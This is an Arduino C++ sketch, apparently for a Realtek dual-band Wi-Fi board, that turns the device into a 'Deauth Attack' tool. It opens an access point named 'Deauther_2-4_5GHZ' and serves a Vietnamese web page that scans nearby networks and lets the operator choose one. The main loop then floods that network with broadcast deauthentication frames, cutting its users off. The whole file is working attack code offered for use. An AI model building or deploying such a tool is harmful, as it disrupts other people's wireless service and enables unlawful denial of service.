#include <vector>
#include <map>
#include "WiFi.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "wifi_cust_tx.h"

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "Deauther_2-4_5GHZ";
char *pass = "123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
std::vector<int> deauth_targets;
unsigned long deauth_start_time = 0; 
std::vector<uint16_t> reason_codes = {0,1,2,3,4,5,6,7,8,9,10,12,13,14,15,16,17,18,19,20,21,22,23,24};
int reason_index = 0;
int current_target = -1;

// Scan Wi-Fi
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  Serial.println("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(500);
    Serial.println("Scan done!");
    return 0;
  } else {
    Serial.println("Scan failed!");
    return 1;
  }
}

// HTTP helpers
String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::map<String,String> parsePost(String &request) {
  std::map<String,String> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if(body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);
  int start = 0, end = post_data.indexOf('&', start);
  while(end != -1){
    String pair = post_data.substring(start,end);
    int delim = pair.indexOf('=');
    if(delim != -1) post_params[pair.substring(0,delim)] = pair.substring(delim+1);
    start = end +1;
    end = post_data.indexOf('&',start);
  }
  String pair = post_data.substring(start);
  int delim = pair.indexOf('=');
  if(delim != -1) post_params[pair.substring(0,delim)] = pair.substring(delim+1);
  return post_params;
}

String makeResponse(int code, String content_type) {
  String res = "HTTP/1.1 " + String(code) + " OK\n";
  res += "Content-Type: " + content_type + "\n";
  res += "Connection: close\n\n";
  return res;
}

String makeRedirect(String url){
  String res = "HTTP/1.1 307 Temporary Redirect\n";
  res += "Location: " + url + "\n\n";
  return res;
}

// Handle root page
void handleRoot(WiFiClient &client){
  String html = "<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Deauth Attack</title></head><body>";
  html += "<h1>Trang Tấn Công Deauth</h1>";
  html += "<table border='1'><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần Số</th></tr>";
  for(size_t i=0;i<scan_results.size();i++){
    html += "<tr><td>" + String(i+1) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>"
           + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>"
           + ((scan_results[i].channel>=36)?"5GHz":"2.4GHz") + "</td></tr>";
  }
  html += "</table>";
  html += "<form method='post' action='/deauth'>";
  html += "Chọn mạng: <select name='net_num'>";
  for(size_t i=0;i<scan_results.size();i++){
    html += "<option value='"+String(i)+"'>"+scan_results[i].ssid+"</option>";
  }
  html += "</select>";
  int random_reason = random(0,24);
  html += "<input type='hidden' name='reason' value='"+String(random_reason)+"'>";
  html += "<button type='submit'>Bắt đầu Deauth</button></form>";
  html += "<form method='post' action='/stop'><button type='submit'>Dừng Deauth</button></form>";
  html += "<form method='post' action='/rescan'><button type='submit'>Quét lại</button></form>";
  html += "</body></html>";
  String res = makeResponse(200,"text/html");
  res += html;
  client.write(res.c_str());
}

// Handle deauth POST
void handleDeauth(WiFiClient &client, String &request){
  std::map<String,String> post = parsePost(request);
  deauth_targets.clear();
  if(post.find("net_num")!=post.end()){
    int target = post["net_num"].toInt();
    if(target>=0 && target<(int)scan_results.size()){
      deauth_targets.push_back(target);
      deauth_reason = post["reason"].toInt();
      deauth_running = true;
      deauth_start_time = millis();
      Serial.println("Deauth started on: "+scan_results[target].ssid);
    }
  }
  client.write(makeRedirect("/status").c_str());
}

// Handle stop POST
void handleStopDeauth(WiFiClient &client){
  deauth_running = false;
  client.write(makeRedirect("/").c_str());
}

// Handle status
void handleStatus(WiFiClient &client){
  String html = "<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Status</title></head><body><h1>Trạng thái tấn công Deauth</h1>";
  if(deauth_running){
    html += "<p>Đang tấn công các mục tiêu:</p><ul>";
    for(int t: deauth_targets) html += "<li>"+scan_results[t].ssid+"</li>";
    html += "</ul>";
    html += "<p>Thời gian từ khi bắt đầu: "+String((millis()-deauth_start_time)/1000)+" giây</p>";
  }else{
    html += "<p>Không có cuộc tấn công nào.</p>";
  }
  html += "<a href='/'>Quay lại</a></body></html>";
  String res = makeResponse(200,"text/html");
  res += html;
  client.write(res.c_str());
}

// Setup
void setup(){
  Serial.begin(115200);
  randomSeed(millis());
  pinMode(2,OUTPUT); // LED
  IPAddress local_ip(192,168,4,1), gateway(192,168,4,1), subnet(255,255,255,0);
  WiFi.config(local_ip,gateway,subnet);
  WiFi.apbegin(ssid, pass, (char*)String(current_channel).c_str());
  if(scanNetworks()!=0) while(1) delay(1000);
  server.begin();
}

// Main loop
void loop(){
  WiFiClient client = server.available();
  if(client.connected()){
    String request;
    while(client.available()) request += (char)client.read();
    String path = parseRequest(request);
    if(path=="/") handleRoot(client);
    else if(path=="/status") handleStatus(client);
    else if(path=="/deauth") handleDeauth(client,request);
    else if(path=="/stop") handleStopDeauth(client);
    else if(path=="/rescan"){ scanNetworks(); client.write(makeRedirect("/").c_str()); }
  }

  // Nếu đang tấn công, gửi deauth packet liên tục
  if(deauth_running){
    for(int t: deauth_targets){
      if(t>=0 && t<(int)scan_results.size()){
        memcpy(deauth_bssid, scan_results[t].bssid, 6);
        wifi_tx_deauth_frame(deauth_bssid,(void*)"\xFF\xFF\xFF\xFF\xFF\xFF",deauth_reason);
      }
    }
  }
}
